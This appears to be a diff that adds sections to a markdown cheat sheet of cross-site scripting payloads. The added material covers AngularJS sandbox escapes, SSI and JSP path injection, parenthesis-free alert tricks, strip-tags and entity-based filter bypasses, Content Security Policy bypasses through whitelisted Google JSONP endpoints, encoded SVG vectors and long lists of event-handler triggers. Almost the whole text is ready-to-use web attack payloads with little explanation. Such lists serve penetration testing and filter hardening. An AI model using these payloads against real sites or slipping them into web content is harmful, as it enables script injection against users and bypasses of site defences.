@@ -33,3 +33,167 @@ XML Based XSS
 <x:script xmlns:x="http:/www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:script xmlns:x="http:/www.w3.org/1999/xhtml" src="collaborattor"/>
 ```
+
+AngularJS Injections (v1.6 and up)
+
+```
+{{$new.constructor('alert(1)')()}}
+<x ng-app>{{$new.constructor('alert(1)')()}}
+```
+
+
+XSS in SSI 
+
+```
+<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
+```
+
+Injection in JSP Path
+
+```
+/DOMAIN/PATH/;<svg onload=alert(1)>
+/DOMAIN/PATH/;"><svg onload=alert(1)>
+```
+
+
+Alert without Parentheses
+
+```
+setTimeout`alert\x28document.domain\x29`
+setInterval`alert\x28document.domain\x29`
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+
+```
+
+
+Alert Alternative – Open Pseudo-Protocol
+
+```
+top.open`javas\cript:al\ert\x281\x29`
+top.open`javas\cript:al\ert\x281\x29${0}0`
+```
+
+
+Alert Alternative - Eval + URL
+
+```
+<svg onload=eval(" ' "+URL)>
+<svg id=eval onload=top[id](" ' "+URL)>
+```
+
+HTML Injection - Inline Alternative
+
+```
+"onpointerover=alert(1) /
+"autofocus onfocusin=alert(1) /
+```
+
+Strip-Tags Based Bypass
+
+```
+"o<x>nmouseover=alert<x>(1)/
+"autof<x>ocus o<x>nfocus=alert<x>(1)/
+```
+
+Jump to URL Fragment
+```
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1)
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+```
+
+CSP Bypass (for Whitelisted Google Domains)
+
+```
+<script src=/www.google.com/complete/search?client=chrome%26jsonp=alert(1)> </script>
+<script src=/www.googleapis.com/customsearch/v1?calback=alert(1)></script>
+<script src=/ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
+</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
+```
+
+
+SVG Vectors with Event Handlers
+
+```
+<svg><set onbegin=alert(1)>
+<svg><set end=1 onend=alert(1)>
+```
+
+SVG Vectors without Event Handlers
+
+```
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+```
+
+Vectors without Event Handlers
+```
+<script>alert(1)</script>
+<script src=data:,alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+```
+
+Vectors with Agnostic Event Handlers
+
+```
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x onauxclick=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmouseenter=alert(1)>hover this
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<x onpointercancel=alert(1)>hover this!
+<x onpointerdown=alert(1)>hover this!
+<x onpointerenter=alert(1)>hover this!
+<x onpointerleave=alert(1)>hover this!
+<x onpointermove=alert(1)>hover this!
+<x onpointerout=alert(1)>hover this!
+<x onpointerover=alert(1)>hover this!
+<x onpointerup=alert(1)>hover this!
+<x onpointerrawupdate=alert(1)>hover this!
+```
+
+
+
+Mixed Context Reflection Entity Bypass
+
+```
+">'-alert(1)-'<svg>
+">&#39-alert(1)-&#39<svg>
+">alert(1)-"<svg>
+"&#34>alert(1)-&#34<svg>
+```
+
+
+
